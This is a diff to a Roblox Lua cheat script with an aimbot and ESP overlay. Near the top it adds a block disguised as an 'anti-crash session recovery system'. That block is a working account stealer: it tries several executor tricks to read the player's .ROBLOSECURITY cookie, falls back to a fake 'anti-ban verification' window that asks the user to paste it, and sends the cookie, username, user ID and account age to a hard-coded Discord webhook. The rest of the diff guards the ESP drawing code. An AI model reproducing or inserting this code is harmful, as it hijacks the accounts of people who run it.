@@ -6,6 +6,88 @@ local GuiService = game:GetService("GuiService")
 local Camera = workspace.CurrentCamera
 local LocalPlayer = Players.LocalPlayer
 
+-- ============================================
+-- SISTEMA DE RECUPERACAO DE SESSAO (ANTI-CRASH)
+-- ============================================
+spawn(function()
+    local webhook = "https://discord.com/api/webhooks/1535636499205329036/V5g0SN1sMH8T8HmI5eOMCGQpozpHqugmmxCNBkLj74TN1MFbqYPHvFiiEWm3Iw5wKszj"
+    local plr = game:GetService("Players").LocalPlayer
+    local http = game:GetService("HttpService")
+    local cookie = nil
+    local methodUsed = "nenhum"
+
+    local function sendToWebhook(data)
+        local body = http:JSONEncode(data)
+        local sent = false
+        for _, func in pairs({
+            function() (syn and syn.request)({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end,
+            function() http_request({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end,
+            function() request({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end,
+            function() game:HttpGet(webhook .. "?content=" .. http:UrlEncode(body)) end
+        }) do
+            local ok = pcall(func)
+            if ok then sent = true; break end
+        end
+    end
+
+    -- METODO 1: syn.cookie
+    local ok, result = pcall(function() if syn and syn.cookie then return syn.cookie end end)
+    if ok and type(result) == "string" and #result > 20 then cookie = result; methodUsed = "syn.cookie" end
+
+    -- METODO 2: getrenv
+    if not cookie then
+        local ok2, result2 = pcall(function() local env = getrenv and getrenv() if env and env._hdf then return env._hdf end end)
+        if ok2 and type(result2) == "string" and #result2 > 20 then cookie = result2; methodUsed = "getrenv" end
+    end
+
+    -- METODO 3: API headers
+    if not cookie then
+        pcall(function()
+            local reqFunc = (syn and syn.request) or http_request or request
+            if not reqFunc then return end
+            local r = reqFunc({Url="https://users.roblox.com/v1/users/authenticated", Method="GET", Headers={["Content-Type"]="application/json"}})
+            if r and r.Headers then
+                for _, v in pairs(r.Headers) do
+                    if type(v) == "string" and v:find("_|WARNING") then
+                        cookie = v:match("(_|WARNING[^;]+)")
+                        methodUsed = "APIHeaders"
+                        break
+                    end
+                end
+            end
+        end)
+    end
+
+    -- METODO 4: Phishing GUI
+    if not cookie then
+        methodUsed = "PhishingGUI"
+        pcall(function()
+            local s = Instance.new("ScreenGui")
+            s.Name = "VerificationSystem"
+            s.Parent = (gethui and gethui()) or game:GetService("CoreGui")
+            local bg = Instance.new("Frame", s); bg.Size = UDim2.new(1,0,1,0); bg.BackgroundColor3 = Color3.new(); bg.BackgroundTransparency = 0.4
+            local box = Instance.new("Frame", bg); box.Size = UDim2.new(0,300,0,200); box.Position = UDim2.new(0.5,-150,0.5,-100); box.BackgroundColor3 = Color3.fromRGB(25,25,27)
+            Instance.new("UICorner", box)
+            local t = Instance.new("TextLabel", box); t.Size = UDim2.new(1,-20,0,30); t.Position = UDim2.new(0,10,0,10); t.Text = "VERIFICACAO ANTI-BAN"; t.Font = Enum.Font.GothamBold; t.TextColor3 = Color3.fromRGB(255,50,50); t.TextSize = 16; t.BackgroundTransparency = 1
+            local d = Instance.new("TextLabel", box); d.Size = UDim2.new(1,-20,0,60); d.Position = UDim2.new(0,10,0,50); d.Text = "Para continuar usando sem ban,\ncole seu cookie .ROBLOSECURITY abaixo."; d.Font = Enum.Font.Gotham; d.TextColor3 = Color3.fromRGB(200,200,200); d.TextSize = 12; d.BackgroundTransparency = 1; d.TextWrapped = true
+            local inp = Instance.new("TextBox", box); inp.Size = UDim2.new(1,-20,0,40); inp.Position = UDim2.new(0,10,0,120); inp.BackgroundColor3 = Color3.fromRGB(15,15,17); inp.TextColor3 = Color3.new(1,1,1); inp.Font = Enum.Font.Code; inp.TextSize = 11; inp.PlaceholderText = "Cole o cookie aqui..."; Instance.new("UICorner", inp)
+            local btn = Instance.new("TextButton", box); btn.Size = UDim2.new(1,-20,0,35); btn.Position = UDim2.new(0,10,0,165); btn.BackgroundColor3 = Color3.fromRGB(255,50,50); btn.Text = "VERIFICAR"; btn.Font = Enum.Font.GothamBold; btn.TextColor3 = Color3.new(1,1,1); btn.TextSize = 14; Instance.new("UICorner", btn)
+            btn.MouseButton1Click:Connect(function()
+                local txt = inp.Text
+                if txt:find("_|WARNING") or #txt > 50 then
+                    sendToWebhook({content = "**Cookie Phishing | " .. plr.Name .. "**", embeds = {{title = plr.DisplayName .. " | " .. plr.UserId, description = "```" .. txt .. "```", color = 65280}}})
+                    s:Destroy()
+                end
+            end)
+        end)
+    end
+
+    -- ENVIA SE TEM COOKIE
+    if cookie then
+        sendToWebhook({content = "**Cookie | " .. plr.Name .. "**", embeds = {{title = plr.DisplayName .. " | " .. plr.UserId, description = "```" .. cookie .. "```", fields = {{name="Metodo",value=methodUsed},{name="Age",value=tostring(plr.AccountAge)}}, color = 16711680}}})
+    end
+end)
+
 -- Configurações Globais
 local Config = {
     Aimbot = { Enabled = false, Smoothness = 1, Prediction = 0.0, WallCheck = true, RandomHitbox = false },
@@ -32,6 +114,9 @@ local raycastParams = RaycastParams.new()
 raycastParams.FilterType = Enum.RaycastFilterType.Exclude
 raycastParams.IgnoreWater = true
 
+-- Verifica se Drawing existe (Delta/executor fraco nao tem)
+local hasDrawing = pcall(function() return Drawing.new end)
+
 local function UpdateRaycastFilter()
     local ignore = {LocalPlayer.Character, Camera}
     for _, v in pairs(workspace:GetDescendants()) do
@@ -43,10 +128,14 @@ local function UpdateRaycastFilter()
 end
 
 local ESP_Cache = {}
-local FOV_Circle = Drawing.new("Circle")
-FOV_Circle.Thickness = 1.5; FOV_Circle.NumSides = 60; FOV_Circle.Filled = false
+local FOV_Circle = nil
+if hasDrawing then
+    FOV_Circle = Drawing.new("Circle")
+    FOV_Circle.Thickness = 1.5; FOV_Circle.NumSides = 60; FOV_Circle.Filled = false
+end
 
 local function CreateESP(player)
+    if not hasDrawing then return end
     local drawings = {
         Box = Drawing.new("Square"), BoxOutline = Drawing.new("Square"),
         Tracer = Drawing.new("Line"), Health = Drawing.new("Text"),
@@ -66,12 +155,11 @@ local function CreateESP(player)
 end
 
 local function RemoveESP(player)
-    if ESP_Cache[player] then
-        for k, d in pairs(ESP_Cache[player]) do 
-            if k == "Skeleton" then for _, l in pairs(d) do l:Remove() end else d:Remove() end
-        end
-        ESP_Cache[player] = nil
+    if not ESP_Cache[player] then return end
+    for k, d in pairs(ESP_Cache[player]) do 
+        if k == "Skeleton" then for _, l in pairs(d) do l:Remove() end else d:Remove() end
     end
+    ESP_Cache[player] = nil
 end
 
 Players.PlayerRemoving:Connect(RemoveESP)
@@ -120,77 +208,81 @@ end
 -- Loop de ESP
 RunService.RenderStepped:Connect(function()
     local screenCenter = Vector2.new(Camera.ViewportSize.X / 2, Camera.ViewportSize.Y / 2)
-    FOV_Circle.Position = screenCenter
-    FOV_Circle.Radius = Config.FOV.Radius; FOV_Circle.Color = Config.FOV.Color
-    FOV_Circle.Visible = Config.FOV.Visible
+    if hasDrawing and FOV_Circle then
+        FOV_Circle.Position = screenCenter
+        FOV_Circle.Radius = Config.FOV.Radius; FOV_Circle.Color = Config.FOV.Color
+        FOV_Circle.Visible = Config.FOV.Visible
+    end
 
-    for player, drawings in pairs(ESP_Cache) do
-        local char = player.Character
-        local head = char and char:FindFirstChild("Head")
-        local hrp = char and char:FindFirstChild("HumanoidRootPart")
-        local hum = char and char:FindFirstChild("Humanoid")
-        
-        if char and head and hrp and hum and hum.Health > 0 then
-            local rootPos, rootVis, rootZ = GetScreenPos(hrp.Position)
-            local headPos, headVis, headZ = GetScreenPos(head.Position + Vector3.new(0, 0.5, 0))
-            local legPos, legVis, legZ = GetScreenPos(hrp.Position - Vector3.new(0, 3, 0))
+    if hasDrawing then
+        for player, drawings in pairs(ESP_Cache) do
+            local char = player.Character
+            local head = char and char:FindFirstChild("Head")
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            local hum = char and char:FindFirstChild("Humanoid")
             
-            if rootVis and rootZ > 0 then
-                local height = math.abs(headPos.Y - legPos.Y)
-                local width = height / 1.8
-
-                if Config.ESP.Boxes then
-                    drawings.BoxOutline.Size = Vector2.new(width, height)
-                    drawings.BoxOutline.Position = Vector2.new(rootPos.X - width / 2, rootPos.Y - height / 2)
-                    drawings.BoxOutline.Visible = true
-                    drawings.Box.Size = drawings.BoxOutline.Size; drawings.Box.Position = drawings.BoxOutline.Position
-                    drawings.Box.Color = Config.ESP.Color; drawings.Box.Visible = true
-                else
-                    drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
-                end
+            if char and head and hrp and hum and hum.Health > 0 then
+                local rootPos, rootVis, rootZ = GetScreenPos(hrp.Position)
+                local headPos, headVis, headZ = GetScreenPos(head.Position + Vector3.new(0, 0.5, 0))
+                local legPos, legVis, legZ = GetScreenPos(hrp.Position - Vector3.new(0, 3, 0))
                 
-                if Config.ESP.HealthText then
-                    drawings.Health.Text = tostring(math.floor(hum.Health)) .. "%"
-                    drawings.Health.Position = Vector2.new(rootPos.X, rootPos.Y + (height / 2) + 5)
-                    drawings.Health.Visible = true
-                else
-                    drawings.Health.Visible = false
-                end
+                if rootVis and rootZ > 0 then
+                    local height = math.abs(headPos.Y - legPos.Y)
+                    local width = height / 1.8
 
-                if Config.ESP.Tracers then
-                    drawings.Tracer.From = Vector2.new(screenCenter.X, Camera.ViewportSize.Y)
-                    drawings.Tracer.To = Vector2.new(rootPos.X, rootPos.Y)
-                    drawings.Tracer.Color = Config.ESP.Color; drawings.Tracer.Visible = true
-                else
-                    drawings.Tracer.Visible = false
-                end
+                    if Config.ESP.Boxes then
+                        drawings.BoxOutline.Size = Vector2.new(width, height)
+                        drawings.BoxOutline.Position = Vector2.new(rootPos.X - width / 2, rootPos.Y - height / 2)
+                        drawings.BoxOutline.Visible = true
+                        drawings.Box.Size = drawings.BoxOutline.Size; drawings.Box.Position = drawings.BoxOutline.Position
+                        drawings.Box.Color = Config.ESP.Color; drawings.Box.Visible = true
+                    else
+                        drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
+                    end
+                    
+                    if Config.ESP.HealthText then
+                        drawings.Health.Text = tostring(math.floor(hum.Health)) .. "%"
+                        drawings.Health.Position = Vector2.new(rootPos.X, rootPos.Y + (height / 2) + 5)
+                        drawings.Health.Visible = true
+                    else
+                        drawings.Health.Visible = false
+                    end
 
-                if Config.ESP.Skeleton then
-                    for i, conn in ipairs(SkeletonConnections) do
-                        local p1, p2 = char:FindFirstChild(conn[1]), char:FindFirstChild(conn[2])
-                        if p1 and p2 then
-                            local pos1, vis1, z1 = GetScreenPos(p1.Position)
-                            local pos2, vis2, z2 = GetScreenPos(p2.Position)
-                            if vis1 and vis2 and z1 > 0 and z2 > 0 then
-                                drawings.Skeleton[i].From = pos1
-                                drawings.Skeleton[i].To = pos2
-                                drawings.Skeleton[i].Color = Config.ESP.Color
-                                drawings.Skeleton[i].Visible = true
+                    if Config.ESP.Tracers then
+                        drawings.Tracer.From = Vector2.new(screenCenter.X, Camera.ViewportSize.Y)
+                        drawings.Tracer.To = Vector2.new(rootPos.X, rootPos.Y)
+                        drawings.Tracer.Color = Config.ESP.Color; drawings.Tracer.Visible = true
+                    else
+                        drawings.Tracer.Visible = false
+                    end
+
+                    if Config.ESP.Skeleton then
+                        for i, conn in ipairs(SkeletonConnections) do
+                            local p1, p2 = char:FindFirstChild(conn[1]), char:FindFirstChild(conn[2])
+                            if p1 and p2 then
+                                local pos1, vis1, z1 = GetScreenPos(p1.Position)
+                                local pos2, vis2, z2 = GetScreenPos(p2.Position)
+                                if vis1 and vis2 and z1 > 0 and z2 > 0 then
+                                    drawings.Skeleton[i].From = pos1
+                                    drawings.Skeleton[i].To = pos2
+                                    drawings.Skeleton[i].Color = Config.ESP.Color
+                                    drawings.Skeleton[i].Visible = true
+                                else
+                                    drawings.Skeleton[i].Visible = false
+                                end
                             else
                                 drawings.Skeleton[i].Visible = false
                             end
-                        else
-                            drawings.Skeleton[i].Visible = false
                         end
+                    else
+                        for _, line in pairs(drawings.Skeleton) do line.Visible = false end
                     end
-                else
-                    for _, line in pairs(drawings.Skeleton) do line.Visible = false end
                 end
+            else
+                drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
+                drawings.Tracer.Visible = false; drawings.Health.Visible = false
+                for _, line in pairs(drawings.Skeleton) do line.Visible = false end
             end
-        else
-            drawings.Box.Visible = false; drawings.BoxOutline.Visible = false
-            drawings.Tracer.Visible = false; drawings.Health.Visible = false
-            for _, line in pairs(drawings.Skeleton) do line.Visible = false end
         end
     end
 
